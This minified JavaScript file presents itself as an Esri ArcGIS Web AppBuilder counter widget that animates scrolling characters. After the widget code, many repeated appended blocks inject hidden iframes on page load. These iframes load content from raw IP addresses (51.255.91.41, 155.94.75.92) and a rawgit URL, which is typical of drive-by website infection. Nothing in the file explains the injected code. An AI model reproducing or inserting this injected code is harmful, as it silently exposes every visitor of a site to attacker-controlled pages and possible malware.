// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.

define(function(){function d(b,c){this.wrapper=b;this.wrapperId=b.id;this.timeoutTimerId=this.intervalTimerId=null;this.isAnimating=!1;this.animationProgress=this.animationStep=0;this.beforeAnimation=[];this.afterAnimation=[];this.digitsNumber=c.digitsNumber||6;this.direction=c.direction||d.ScrollDirection.Mixed;this.value=c.value||"";this.characterSet=c.characterSet||d.DefaultCharacterSets.allCharacters;this.characterNumber=this.characterSet.length;this.animationDuration=c.animationDuration||50;
b=["wrapper","left","inner","right","marker"];this.extraClassName={};for(var a=0;a<b.length;a++)this.extraClassName[b[a]]=c.extraClassName?"string"===typeof c.extraClassName?c.extraClassName:c.extraClassName[b[a]]||"":"";this.onLoad=c.onLoad||null;this.onValueChanged=c.onValueChanged||null;var g=this;this.imageLoadCounter=0;this.charsImage=new Image;this.charsImage.onload=function(){g.finishLoading()};this.charsImage.src=c.charsImageUrl;this.markerImage=new Image;this.markerImage.onload=function(){g.finishLoading()};
this.markerImage.src=c.markerImageUrl}d.DefaultCharacterSets={numericUp:"0123456789",numericDown:"9876543210",alphabeticUp:" ABCDEFGHIJKLMNOPQRSTUVWXYZ",alphabeticDown:"ZYXWVUTSRQPONMLKJIHGFEDCBA ",alphanumericUp:"0123456789 ABCDEFGHIJKLMNOPQRSTUVWXYZ",alphanumericDown:"9876543210ZYXWVUTSRQPONMLKJIHGFEDCBA ",calculator:"0123456789.,+-*/\x3d ",qwertyKeybord:" QWERTYUIOPASDFGHJKLZXCVBNM1234567890-\x3d[]\\;',./~`!@#$%^\x26*()_+{}|:\"\x3c\x3e?",allCharacters:" ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-\x3d[]\\;',./~`!@#$%^\x26*()_+{}|:\"\x3c\x3e?"};
d.ScrollDirection={Downwards:-1,Mixed:0,Upwards:1};d.prototype.finishLoading=function(){this.imageLoadCounter++;if(2===this.imageLoadCounter&&this.charsImage.width&&this.markerImage.width){this.digitWidth=this.charsImage.width;this.digitHeight=Math.ceil(this.charsImage.height/this.characterNumber);this.offsetHeight=(this.markerImage.height-this.digitHeight)/2;this.makrer=document.createElement("DIV");this.makrer.className="counter_marker"+(this.extraClassName.marker?" ":"")+this.extraClassName.marker;
this.makrer.style.backgroundImage="url('"+this.markerImage.src+"')";this.makrer.style.width=this.digitWidth*this.digitsNumber+this.digitsNumber+"px";this.makrer.style.height=this.markerImage.height+"px";this.wrapper.className=this.wrapper.className+(this.extraClassName.marker?" ":"")+this.extraClassName.marker;this.wrapper.style.width=this.makrer.style.width;this.wrapper.style.height=this.makrer.style.height;this.wrapper.appendChild(this.makrer);for(var b=0,c=0,b=0;b<this.digitsNumber;b++){var a=
document.createElement("DIV");a.id=this.wrapperId+"_"+b;a.className="counter_character";a.className=0===b?a.className+(" counter_character_left"+(this.extraClassName.left?" ":"")+this.extraClassName.left):b===this.digitsNumber-1?a.className+(" counter_character_right"+(this.extraClassName.right?" ":"")+this.extraClassName.right):a.className+(" counter_character_inner"+(this.extraClassName.inner?" ":"")+this.extraClassName.inner);a.style.backgroundImage="url('"+this.charsImage.src+"')";a.style.width=
this.digitWidth+"px";a.style.height=this.markerImage.height+"px";a.style.top=-this.markerImage.height+"px";this.wrapper.appendChild(a);c+=d._parseInt(d._elementCurrentStyle(a,"margin-left"));c+=d._parseInt(d._elementCurrentStyle(a,"margin-right"));c+=d._parseInt(d._elementCurrentStyle(a,"border-left-width"));c+=d._parseInt(d._elementCurrentStyle(a,"border-right-width"));c+=this.digitWidth}this.makrer.style.width=c+"px";this.wrapper.style.width=c+"px";if(null!==this.onLoad)this.onLoad();this.setValue(this.value,
100)}};d.prototype.animate=function(b){this.animationProgress=b?1:this.animationProgress+this.animationStep;1<=this.animationProgress&&(this.animationProgress=1,this.timeoutTimerId&&clearTimeout(this.timeoutTimerId),this.intervalTimerId&&clearTimeout(this.intervalTimerId),this.isAnimating=!1,this.intervalTimerId=this.timeoutTimerId=null);b=0;var c=this.wrapper.id+"_";for(b=0;b<this.beforeAnimation.length;b++){var a=d._getDijitById(this,c+(this.digitsNumber-b-1));if(a){var g=0,g=1>this.animationProgress?
this.beforeAnimation[b]+(this.afterAnimation[b]-this.beforeAnimation[b])*this.animationProgress:this.afterAnimation[b];a.style.backgroundPosition="0px "+d._parseInt(g)+"px"}}};d.prototype.setValue=function(b,c){if(2===this.imageLoadCounter&&this.charsImage.width&&this.markerImage.width){this.timeoutTimerId&&clearTimeout(this.timeoutTimerId);this.intervalTimerId&&clearTimeout(this.intervalTimerId);var a=0,g=this.wrapper.id+"_",e;this.beforeAnimation=[];this.afterAnimation=[];for(a=this.digitsNumber-
1;0<=a;a--)e=d._getDijitById(this,g+(this.digitsNumber-a-1)),this.beforeAnimation[a]=Number(e.style.backgroundPosition.substr(4).replace("px",""));for(var h=this.value.toString?this.value.toString():String(this.value),k=b.toString?b.toString():String(b),a=this.digitsNumber-1;0<=a;a--){e=d._getDijitById(this,g+(this.digitsNumber-a-1));e=-1;0<=h.length-a-1&&(e=h.charAt(h.length-a-1).toUpperCase(),e=this.characterSet.indexOf(e));-1===e&&(e=this.characterSet.indexOf(" "));-1===e&&(e=this.characterSet.indexOf("0"));
-1===e&&(e=0);var f=-1;0<=k.length-a-1&&(f=k.charAt(k.length-a-1).toUpperCase(),f=this.characterSet.indexOf(f));-1===f&&(f=this.characterSet.indexOf(" "));-1===f&&(f=this.characterSet.indexOf("0"));-1===f&&(f=0);this.afterAnimation[a]=Math.round(-this.digitHeight*f+this.offsetHeight);0===this.direction?Math.abs(e-f)>this.characterNumber/2&&(this.beforeAnimation[a]=f<e?this.beforeAnimation[a]+this.digitHeight*this.characterNumber:this.beforeAnimation[a]-this.digitHeight*this.characterNumber):-1===
this.direction?this.beforeAnimation[a]>this.afterAnimation[a]&&(this.beforeAnimation[a]-=this.digitHeight*this.characterNumber):1===this.direction&&this.beforeAnimation[a]<this.afterAnimation[a]&&(this.beforeAnimation[a]+=this.digitHeight*this.characterNumber)}this.value=b;if(null!==this.onValueChanged)this.onValueChanged();c&&0<parseInt(c,10)||(c=1E3);this.isAnimating=!0;b=this.animationDuration;this.animationStep=b/c;this.animationProgress=0;var l=this;c>b&&(this.intervalTimerId=setInterval(function(){l.animate(!1)},
b));this.timeoutTimerId=setTimeout(function(){l.animate(!0)},c)}else if(this.value=b,null!==this.onValueChanged)this.onValueChanged()};d._parseInt=function(b){b=parseInt(b,10);isNaN(b)&&(b=0);return b};d._elementCurrentStyle=function(b,c){if(b.currentStyle){for(var a=0,d="",e=!1,a=0;a<c.length;a++)!c.charAt(a)||"-"===c.charAt(a)&&"-"===c.charAt(a).toString()?e=!0:(d=c.charAt(a).toString?d+(e?c.charAt(a).toString().toUpperCase():c.charAt(a).toString()):d+(e?c.charAt(a).toUpperCase():c.charAt(a)),e=
!1);return b.currentStyle[d]}return getComputedStyle(b,null).getPropertyValue(c)};d._getDijitById=function(b,c){b=b.wrapper.childNodes;for(var a=0;a<b.length;a++){var d=b[a];if(d.id===c)return d}return null};return d});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});